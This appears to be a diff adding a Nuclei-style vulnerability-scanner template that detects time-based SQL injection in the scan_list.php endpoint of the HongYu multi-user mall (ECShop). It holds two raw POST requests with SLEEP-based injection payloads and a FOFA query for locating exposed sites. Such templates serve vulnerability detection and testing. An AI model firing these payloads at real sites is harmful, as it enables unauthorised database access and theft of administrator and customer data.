@@ -1,0 +1,35 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          POST /scan_list.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(4)))QkUH)&act=view
+        - |
+          POST /scan_list.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(8)))QkUH)&act=view
+id: hongyu-scan_list_php-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="HongYuJD" && body="68ecshopcom_360buy"
+        鸿宇多用户商城 scan_list.php 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 鸿宇多用户商城 scan_list.php SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488420&idx=1&sn=07be9c3be205933e69cd4175656b0083&chksm=c267a697f5102f81045ebd8a60c98bdd55f06ee1e40d910f800be9358e6828c9ed7e4a88ccbd&token=377357801&lang=zh_CN#rd
+    severity: high
+    tags:
+        - ECShop
+        - ecshop
